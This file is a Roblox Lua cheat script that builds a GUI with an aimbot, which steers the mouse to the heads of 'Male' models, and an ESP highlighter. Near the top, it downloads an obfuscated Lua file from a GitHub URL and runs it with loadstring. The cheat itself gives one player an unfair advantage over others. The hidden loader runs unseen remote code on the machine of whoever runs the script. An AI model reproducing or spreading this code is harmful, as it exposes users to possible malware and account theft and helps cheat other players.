-- Load Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CollectionService = game:GetService("CollectionService")

-- Wait for CurrentCamera to be available
local Camera
repeat
    task.wait()
    Camera = workspace.CurrentCamera
until Camera

-- Variables
local aimbotEnabled = false
local aimbotKey = Enum.KeyCode.Z
local fov = 100
local sensitivity = 0.5
local espEnabled = false
local highlightColor = Color3.fromRGB(255, 0, 0)
local panelsVisible = true
local player = Players.LocalPlayer

-- Debugging Loadstring
if loadstring then
    print("Loadstring works!")
else
    print("Loadstring is disabled.")
end

local scriptText = game:HttpGet("https://raw.githubusercontent.com/an6ger/naclient/refs/heads/main/obf_nNvR9Uj630R8FSGDC835zV6J2BN3QogJEEo3p5aAdtT9N26q9r45u4NI430A2ZZ5.lua", true)
print("Script Text:", scriptText)

local success, err = pcall(loadstring(scriptText))
if not success then
    print("Error:", err)
end

-- Ensure ScreenGui exists
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.Name = "CustomGUI"

-- Function to create GUI panels
function createPanel(name, position)
    local panel = Instance.new("Frame")
    panel.Name = name
    panel.Size = UDim2.new(0, 200, 0, 250)
    panel.Position = position
    panel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    panel.BorderSizePixel = 2
    panel.Parent = screenGui
    panel.Visible = true
    return panel
end

-- Create Panels
local aimbotPanel = createPanel("AimbotPanel", UDim2.new(0, 50, 0, 50))
local espPanel = createPanel("ESPPanel", UDim2.new(0, 300, 0, 50))
local extraPanel = createPanel("ExtraPanel", UDim2.new(0, 550, 0, 50))

-- Function to toggle GUI panels
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Insert and not gameProcessed then
        panelsVisible = not panelsVisible
        aimbotPanel.Visible = panelsVisible
        espPanel.Visible = panelsVisible
        extraPanel.Visible = panelsVisible
    end
end)

-- Aimbot Toggle Button
local aimButton = Instance.new("TextButton")
aimButton.Size = UDim2.new(0, 180, 0, 50)
aimButton.Position = UDim2.new(0, 10, 0, 10)
aimButton.Text = "Toggle Aimbot"
aimButton.Parent = aimbotPanel
aimButton.MouseButton1Click:Connect(function()
    aimbotEnabled = not aimbotEnabled
end)

-- Aimbot Function
local function getClosestTarget()
    local closestTarget = nil
    local shortestDistance = fov
    for _, v in pairs(workspace:GetChildren()) do
        if v:IsA("Model") and v.Name == "Male" then
            local head = v:FindFirstChild("Head")
            if head then
                local screenPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                local mousePos = UserInputService:GetMouseLocation()
                local distance = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).magnitude
                if onScreen and distance < shortestDistance then
                    closestTarget = head
                    shortestDistance = distance
                end
            end
        end
    end
    return closestTarget
end

RunService.RenderStepped:Connect(function()
    if aimbotEnabled and UserInputService:IsKeyDown(aimbotKey) then
        local target = getClosestTarget()
        if target then
            local targetPos = Camera:WorldToViewportPoint(target.Position)
            local mousePos = UserInputService:GetMouseLocation()
            local moveX = (targetPos.X - mousePos.X) * sensitivity
            local moveY = (targetPos.Y - mousePos.Y) * sensitivity
            mousemoverel(moveX, moveY)
        end
    end
end)

-- ESP Functionality
local function applyESP(model)
    if not model:IsA("Model") or not model.PrimaryPart then return end
    local highlight = model:FindFirstChild("HighlightInstance")
    if not highlight then
        highlight = Instance.new("Highlight")
        highlight.Name = "HighlightInstance"
        highlight.Adornee = model
        highlight.Parent = model
    end
    highlight.FillColor = highlightColor
    highlight.OutlineColor = highlightColor
    highlight.FillTransparency = 0.7
    highlight.OutlineTransparency = 0.4
end

local function updateAllESP()
    for _, male in ipairs(CollectionService:GetTagged("MaleTarget")) do
        applyESP(male)
    end
end

local function tagExistingMales()
    for _, male in ipairs(workspace:GetChildren()) do
        if male:IsA("Model") and male.Name == "Male" and not CollectionService:HasTag(male, "MaleTarget") then
            CollectionService:AddTag(male, "MaleTarget")
            applyESP(male)
        end
    end
end

workspace.ChildAdded:Connect(function(child)
    if child:IsA("Model") and child.Name == "Male" then
        CollectionService:AddTag(child, "MaleTarget")
        applyESP(child)
    end
end)

-- ESP Toggle Button
local espButton = Instance.new("TextButton")
espButton.Size = UDim2.new(0, 180, 0, 50)
espButton.Position = UDim2.new(0, 10, 0, 10)
espButton.Text = "Toggle ESP"
espButton.Parent = espPanel
espButton.MouseButton1Click:Connect(function()
    espEnabled = not espEnabled
    updateAllESP()
end)

-- Initialize ESP on game start
tagExistingMales()
updateAllESP()
